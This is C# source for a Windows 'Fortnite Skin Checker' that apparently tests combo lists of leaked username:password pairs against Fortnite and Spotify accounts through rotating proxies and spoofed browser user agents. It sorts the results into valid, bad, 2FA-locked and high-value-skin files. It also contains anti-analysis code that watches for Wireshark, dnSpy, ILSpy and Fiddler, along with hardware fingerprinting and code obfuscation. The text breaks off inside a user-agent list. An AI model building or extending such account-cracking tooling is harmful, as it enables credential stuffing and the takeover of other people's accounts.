using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using xNet;
using System.Drawing.Text;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Globalization;
using System.Diagnostics;
using TCM_Fortnite_Tool.Properties;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Runtime.InteropServices;
using MailKit.Net.Imap;
using System.Collections.Specialized;
using System.Security.Cryptography;
using Timer = System.Timers.Timer;
using System.Management;
using System.Xml;
using Newtonsoft.Json;
using Microsoft.Win32;
using System.Net.Mail;
using ElasticEmailClient;
using System.Net.Http;
using HazardEdit;
using Dannyyy.WebCrawling;
using System.Speech.Synthesis;
using System.Collections;
using MailKit;
using System.Collections.Concurrent;
using FortniteCracker;
using Cyotek.Windows.Forms;
using FortniteChecker.Models.FortniteAPI;
using FortniteChecker.Classes;
using FortniteChecker.Models;
using ArmDot.Client;

namespace TCM_Fortnite_Tool
{
    public partial class Form1 : Form
    {
        public static Process p = Process.GetCurrentProcess();
        public static string cMyProcessName = p.ProcessName;
        private static Anti _anti;
        Random randomimage = new Random();
        Random FuckingProxyless = new Random();
        Random FuckingProxyless1 = new Random();
        Random FuckingProxyless2 = new Random();
        Random FuckingProxyless3 = new Random();
        Random FuckingProxyless4 = new Random();
        public string ProductIDString;
        public string RegisteredOwnerString;
        public string FinalHWID;
        public static string[] strarray;
        private string UseAllForgoogle;
        public string[] GoogleLinkRandom;
        private BackgroundWorker backgroundWorker_8;
        private BackgroundWorker backgroundWorker_1;
        private BackgroundWorker backgroundWorker_5;
        IPAddress myAddress;
        public static string Version = "76.0 (BETA)";
        private ToolTip tp1 = new ToolTip();
        private HashSet<string> Combo = new HashSet<string>();
        private List<string> ComboSplitterCombos = new List<string>();
        private List<string> Proxies = new List<string>();
        private List<string> Dehash = new List<string>();
        private List<string> EACombos = new List<string>();
        private Random rnd = new Random();
        public static Regex REGEX = new Regex(@"\d{1,3}(\.\d{1,3}){3}:\d{1,5}");
        public static List<string> Sources = new List<string>();
        private List<Thread> tList = new List<Thread>();
        private object tLock = new object();
        private object _lock = new object();
        private string fileName;
        private string folder;
        private int index;
        private string myFile;
        private string MyComboFile;
        private string textfile;
        private string validaccounts;
        private string badaccounts;
        private string TWOFAaccounts;
        private string BlackKnight;
        private string CodenameELF;
        private string Crackshot;
        private string GhoulTrooper;
        private string MerryMarauder;
        private string NogOps;
        private string RedNosedRaider;
        private string OGSkullTrooper;
        private string NoneOGSkullTrooper;
        private string GGSave;
        private string YuletideRanger;
        private string Scythe;
        private string SaveTheWorld;
        private string Savevbucks;
        private string SavePCPlatform;
        private string SavePS4Platform;
        private string SaveXboxPlatform;
        private string SaveNintendoPlatform;
        private string StackedAccounts;
        private string Royalebomber;
        private string Candyaxe;
        private string RenegadeSkin;
        private string AerialAssaultTrooper;
        private string Raidersrevenge;
        private string PowerChord;
        private string SgtGreenClover;
        private string STWStandard;
        private string STWDelux;
        private string STWSDelux;
        private string STWLimited;
        private string STWUltimate;
        private string GalaxySkinFound;
        private int validcnt;
        private int invalidcnt;
        private int SpotifyTotalDone;
        private int SpotifyErrors;
        private int SpotifyChecked;
        private int SpotifyInvalid;
        private int SpotifyValid;
        private int SpotifyStudentAccounts;
        private int SpotifyFamilyAccounts;
        private int SpotifyPremiumAccounts;
        private int SpotifyFreeAccounts;
        private int errorcnt;
        private int retrycnt;
        private int rareskins;
        private int STW;
        private int Skully;
        private int RenegadeCount;
        private int VbucksFound;
        private int TotalSkinsChecked;
        private int TotalGlidersChecked;
        private int TotalGalaxyChecked;
        private int TotalMoneyzSpent;
        private int checkedcnt;
        private int lockedCuz2Fa;
        private bool _initialLoad = true;
        public bool enterprogram = false;
        public static bool EnableNoneSkins = true;
        public static string Location;
        public static string State;
        public static int StandardSTW = 0;
        public static int NoobySkullTrooperAccounts = 0;
        public static int OGSkullCount = 0;
        public static int DeluxEditionSTW = 0;
        public static int SuperDeluxSTW = 0;
        public static int LimitedEditionSTWE = 0;
        public static int UltimateEditionSTWE = 0;
        public static int counter = 0;
        private static string BelowtwoSaveName;
        private static string TwoToEightSaveName;
        private static string ToTenSaveName;
        private static string ToTwentySaveName;
        private static string ToThirtySaveName;
        private static string ToFourtySaveName;
        private static string ToFiftySaveName;
        private static string ToSixtySaveName;
        private static string ToSeventySaveName;
        private static string ToEightySaveName;
        private static string ToNinetySaveName;
        private static string OverOneHundoSaveName;
        private static string ToOneThousandSaveName;
        private static string ToTwoThousandSaveName;
        private static string ToThreeThousandSaveName;
        private static string ToFourThousandSaveName;
        private static string ToFiveThousandSaveName;
        private static string ToSixThousandSaveName;
        private static string ToSevenThousandSaveName;
        private static string ToEightThousandSaveName;
        private static string ToNineThousandSaveName;
        private static string ToTenThousandSaveName;
        private static string AboveTenThousandSaveName;
        public static string SpotifyAccountFree;
        public static string SpotifyAccountPremium;
        public static string SpotifyAccountStudent;
        public static string SpotifyAccountFamily;
        public static string InvalidSpotifyAccount;
        public string InValidProxiesPath;
        public string ValidProxiesPath;
        public string AliveProxiesPath;
        public string DeadProxiesPath;
        private string RegularGoodProxiesChecked;
        private string RegularBadProxiesChecked;
        public static string GoogleHomeMiniSpotify;
        private int BadProxies;
        private int GoodProxies;
        private string GoodProxiesSave;
        private int DeadProxies;
        private string BadProxiesChecked;
        public static string PastebinDevKey;
        public static string PastebinUser;
        public static string PasteBinPass;
        string IsPremiumUser = "True";
        public static bool CanSeeDiscord = false;
        public static bool IsUsingTradingSystem = false;
        DateTime startTime = new DateTime();
        TimeSpan elapsedTime = new TimeSpan();
        TimeSpan elapsedTime2 = new TimeSpan();
        MailMessage objeto_mail = new MailMessage();
        SmtpClient client = new SmtpClient();
        private bool isDone { get; set; }
        private bool _Run { get; set; }
        private bool _IsGood { get; set; }
        public ProxyType PType { get; set; }
        public int Threadscount { get; set; }
        public int ThreadSleepCount { get; set; }
        public static string console;
        public static string username;
        public static string imageurls;
        public static string BoardID;
        public static string MachineGUID;
        public static string ProcessorID;
        public static string VolumeID;
        public static string FinalEncrypt;
        public static string FinalPasteBinURL;
        public static bool SharingDisabled = false;
        public string[] GoogleString;
        public string[] RadomClientString;
        public static string SavedOathToken;
        public static string SavedProfileID;
        public Form1()
        {
            LoadFormShit();
        }
        [VirtualizeCode]
        private void LoadFormShit()
        {
            InitializeComponent();
            BreakAnyHTTPSpoofers();
            //UpdateOrNuh();
            GetHWIDInfo();
            _anti = new Anti();
            _anti.Timeout = 100;
            _anti.Snoopers = new string[] { "wireshark", "dnspy", "ilspy", "fiddler", "CrackForum", "Pe Tool" };
            _anti.Start();
            StartCurrentTimers();
            tp1.ToolTipIcon = ToolTipIcon.Info;
            tp1.IsBalloon = true;
            tp1.ShowAlways = true;
            try
            {
                ChangelogShit();
            }
            catch
            {
                MessageBox.Show("Error loading changelog, check internet?");
            }
            try
            {
                if (File.Exists("TCM_Checker_Update_File.rar"))
                {
                    File.Delete("TCM_Checker_Update_File.rar");
                }
            }
            catch
            {
                //
            }
            try
            {
                if (File.Exists("ScraperFiles.rar"))
                {
                    File.Delete("ScraperFiles.rar");
                }
            }
            catch
            {
                //
            }
            try
            {
                if (File.Exists("CrawlerFiles.rar"))
                {
                    File.Delete("CrawlerFiles.rar");
                }
            }
            catch
            {
                //
            }
            LoadUpSettings();
            startnotificationsettings();
            try
            {
                imageurls = new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/FortniteTool/ImageURLs.txt");
            }
            catch
            {
                MessageBox.Show("Error Getting Image Urls, Click Ok to continue");
            }
            try
            {
                pictureBox1.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/TCMpaste.png";
                pictureBox4.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/IG.png";
                pictureBox5.ImageLocation = "http://tcmtools.com/CheckerStuff/Discord/Discord.gif";
                LoadRandomHomeImage();
            }
            catch
            {

            }
            Location = new WebClient().DownloadString("https://ifconfig.me"); // ipv4bot is deprecated
            State = getCountry(Location);
            MainFormTheme.Text = "TCM's Fortnite Skin Checker ---->" + " Welcome [" + Environment.UserName + " --> " + State + "]" + " <----> Version: " + Version;
            ShowNotification("Hello", "Hello and welcome to TCM's Fortnite Tool!");
            try
            {
                ShitNiteImage.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/Background.jpg";
            }
            catch
            {
                //
            }
            try
            {
                FortniteTrackerAPIKey.Text = Properties.Settings.Default["API"].ToString();
            }
            catch
            {

            }
            DateTime date = DateTime.Now;
            string NewDateTime = date.ToString("MMMM dd, yyyy", CultureInfo.InvariantCulture);
            string TimeCurrrentlyIs = date.ToShortTimeString();
            string TimeCurrentFinal = TimeCurrrentlyIs.Replace(":", ".");
            folder = Path.Combine(string.Format("{0}\\Results\\", Application.StartupPath), "Results From " + NewDateTime + " @ " + TimeCurrentFinal);
            if (!Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
            }
            else
            {
                Random RandomNumber = new Random();
                string RandomTimeNumber = RandomNumber.Next(0, 999).ToString();
                folder = Path.Combine(string.Format("{0}\\Results\\", Application.StartupPath), "Results From " + NewDateTime + " @ " + TimeCurrentFinal + " # " + RandomTimeNumber);
                Directory.CreateDirectory(folder);
            }
            cmbProxyType.SelectedIndex = 0;
            try
            {
                BestProxiesAPI.Text = Settings.Default["ProxiesAPI"].ToString();
            }
            catch { }
            Blink();
            RandomClient();
            GoogleLinkRandom = new string[] { "com", "ac", "fr", "tn", "ru" };
        }

        private void RandomClient()
        {
            BackgroundWorker_8 = new BackgroundWorker();
            BackgroundWorker_8.WorkerSupportsCancellation = true;
            BackgroundWorker_1 = new BackgroundWorker();
            BackgroundWorker_1.WorkerSupportsCancellation = true;
            BackgroundWorker_5 = new BackgroundWorker();
            BackgroundWorker_5.WorkerSupportsCancellation = true;
            Control.CheckForIllegalCrossThreadCalls = false;
            UseAllForgoogle = "all";
            ChooseTimeFrameScraper.SelectedIndex = 4;
            RadomClientString = new string[]
        {
            "Mozilla/4.0 (compatible; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8)",
            "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0a2) Gecko/20111101 Firefox/9.0a2",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2.4) Gecko/20100527 Firefox/3.6.4",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20091218 Firefox 3.6b5",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6;en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; de-AT; rv:1.9.1.8) Gecko/20100625 Firefox/3.6.6",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.0",
            "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 5.0; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0",
            "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.0; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 5.1; U; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120405 Firefox/14.0a1",
            "Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/13.0.1",
            "Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:2.0b13pre) Gecko/20110223 Firefox/4.0b13pre",
            "Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101127 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110105 Firefox/4.0b9pre",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0 FirePHP/0.6",
            "Mozilla/5.0 (Windows NT 5.1; rv:8.0; en_us) Gecko/20100101 Firefox/8.0",
            "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 5.2; rv:2.0b13pre) Gecko/20110304 Firefox/4.0b13pre",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1",
            "Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 6.1; U; ru; rv:5.0.1.6) Gecko/20110501 Firefox/5.0.1 Firefox/5.0.1",
            "Mozilla/5.0 (Windows NT 6.1; U;WOW64; de;rv:11.0) Gecko Firefox/11.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:14.0) Gecko/20120405 Firefox/14.0a1",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b10pre) Gecko/20110118 Firefox/4.0b10pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110129 Firefox/4.0b11pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110131 Firefox/4.0b11pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110208 Firefox/4.2a1pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110323 Firefox/4.2a1pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 6.1; de;rv:12.0) Gecko/20120403211507 Firefox/12.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:1.9) Gecko/20100101 Firefox/4.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/ 20120405 Firefox/14.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/14.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20120405 Firefox/14.0a1",
            "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20110319 Firefox/4.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b10pre) Gecko/20110113 Firefox/4.0b10pre",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre Firefox/4.0b6pre",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/7.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20130514 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20120427 Firefox/15.0a1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/5.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0.1) Gecko/20110606 Firefox/4.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0E)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; nb-NO; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.7 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:15.0) Gecko/20121011 Firefox/15.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.0 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-CA; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-TW; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729; .NET CLR 4.0.20506)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100527 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100527 Firefox/3.6.4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US; rv:2.0.4) Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.3) Gecko/20121221 Firefox/3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b1) Gecko/20091014 Firefox/3.6b1 GTB5",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:2.0b10) Gecko/20110126 Firefox/4.0b10",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8 GTB7.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
